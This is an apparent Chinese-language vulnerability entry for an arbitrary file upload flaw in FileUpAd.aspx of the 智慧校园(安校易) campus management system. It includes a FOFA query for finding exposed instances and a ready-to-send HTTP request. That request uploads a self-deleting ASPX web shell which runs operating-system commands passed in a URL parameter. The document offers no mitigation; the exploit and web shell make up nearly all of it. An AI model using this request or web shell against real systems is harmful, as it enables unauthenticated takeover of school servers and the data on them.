## 智慧校园(安校易)管理系统FileUpAd.aspx任意文件上传漏洞

智慧校园(安校易)管理系统  FileUpAd.aspx 接口处存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。

## fofa

```yaml
title="智慧综合管理平台登入"
```

## poc

```java
POST /Module/FileUpPage/FileUpAd.aspx?file_tmid=upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
Connection: close
 
------21909179191068471382830692394
Content-Disposition: form-data; name="File"; filename="asd.aspx"
Content-Type: image/jpeg
 
<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------21909179191068471382830692394--
```

文件路径`http://ip/imgnews/imgad/000000/upload.aspx?cmd=whoami`